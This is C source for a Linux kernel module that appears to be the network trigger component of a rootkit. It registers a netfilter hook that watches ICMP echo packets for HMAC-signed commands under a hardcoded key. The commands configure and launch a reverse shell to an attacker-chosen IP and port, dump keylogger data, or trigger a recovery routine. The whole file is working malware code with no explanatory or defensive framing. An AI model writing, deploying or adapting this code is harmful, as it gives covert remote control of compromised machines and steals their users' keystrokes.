#include "netfilter_trigger.h"
#include "hmac_auth.h"
#include "rootkit_core.h"
#include "reverse_shell.h"
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/skbuff.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/inet.h>

#define MAGIC_KEY "kprz_secret_key"
#define MAX_TRIGGER_DATA 256

static struct nf_hook_ops nfho;

static unsigned int nf_trigger_fn(void *priv,
                                  struct sk_buff *skb,
                                  const struct nf_hook_state *state) {
    struct iphdr *iph;
    struct icmphdr *icmph;
    char *data;
    size_t data_len;
    unsigned char hmac_result[32];
    unsigned char received_hmac[32];
    char *payload_data;
    size_t payload_len;

    if (!skb)
        return NF_ACCEPT;

    iph = ip_hdr(skb);
    if (!iph || iph->protocol != IPPROTO_ICMP)
        return NF_ACCEPT;

    icmph = (struct icmphdr *)(skb_transport_header(skb));
    if (!icmph || icmph->type != ICMP_ECHO)
        return NF_ACCEPT;

    data = (char *)(icmph + 1);
    data_len = skb_tail_pointer(skb) - (unsigned char *)data;
    if (data_len < 64)
        return NF_ACCEPT;

    memcpy(received_hmac, data, 32);
    payload_data = data + 32;
    payload_len = data_len - 32;

    compute_hmac(MAGIC_KEY, payload_data, payload_len, hmac_result);

    if (memcmp(received_hmac, hmac_result, 32) != 0)
        return NF_ACCEPT;

    if (strncmp(payload_data, "SETREVSHELL|", 12) == 0) {
        char *ip_start = payload_data + 12;
        char *port_start = strchr(ip_start, '|');
        if (port_start) {
            *port_start = '\0';
            port_start++;
            configure_reverse_shell(ip_start, simple_strtoul(port_start, NULL, 10));
        }
    } else if (strncmp(payload_data, "RUNREVSHELL", 11) == 0) {
        trigger_payload(PAYLOAD_REVERSE_SHELL);
    } else if (strncmp(payload_data, "KEYDUMP", 7) == 0) {
        trigger_payload(PAYLOAD_KEYLOGGER_DUMP);
    } else if (strncmp(payload_data, "RECOVERY", 8) == 0) {
        trigger_payload(PAYLOAD_TRIGGER_RECOVERY);
    }

    return NF_ACCEPT;
}

void setup_netfilter_trigger(void) {
    nfho.hook = nf_trigger_fn;
    nfho.pf = PF_INET;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfho);
}

void cleanup_netfilter_trigger(void) {
    nf_unregister_net_hook(&init_net, &nfho);
}
